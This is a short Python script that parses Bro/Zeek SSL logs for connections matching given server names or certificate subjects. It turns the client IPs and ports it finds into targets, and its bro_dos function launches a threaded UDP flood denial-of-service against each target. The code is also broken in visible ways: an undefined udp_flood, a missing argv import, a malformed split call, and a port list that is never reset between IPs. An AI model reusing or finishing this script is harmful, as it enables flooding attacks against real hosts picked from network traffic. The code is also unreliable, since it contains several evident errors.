from joblib import Parallel, delayed
from bat import bro_log_reader

from Target import Target


def find_traffic(log,flags):
    reader = bro_log_reader. BroLogReader(log)
    traffic = []
     
    for row in reader.readrows():
        for flag in flags:     
            if (flag) in (row['server_name'] or row['subject']):
                traffic.append({'ip':row['id.orig_h'],'port':row['id.orig_p']})

    return sorted(traffic, key= lambda k: k['ip'])

def sort_ips(sorted_traffic):
    ips = [] 
    for conn in sorted_traffic:
        if conn['ip'] not in ips:
            ips.append(conn['ip'])
    return ips

def make_targets(sorted_traffic, ip_list):
    targets = []
    ports = []

    for ip in ip_list:
        for conn in sorted_traffic:
            if ip == conn['ip']: ports.append(conn['port'])

        p_sorted = sorted(ports)
        T = Target(ip, [p_sorted[0],p_sorted[-1]])
        targets.append(T)

    return targets

def bro_dos(log, flags):
    conns = find_traffic(log,flags)
    ips = sort_ips(conns)
    targets = make_targets(conns, ips)

    for T in targets:
        func = udp_flood(T.ip, T.port, True)
        Parallel(n_jobs = 2, prefer = 'threads')(delayed(func))#for i in range(THREADS))

if __name__ == '__main__':
    log = argv[1]
    flags = argv[2].split[',']
    conns = find_traffic(log,flags)
    ips = sort_ips(conns)
    targets = make_targets(conns, ips)
    for T in targets:
        print('IP: ', T.ip)
        print('Port: ', T.port)
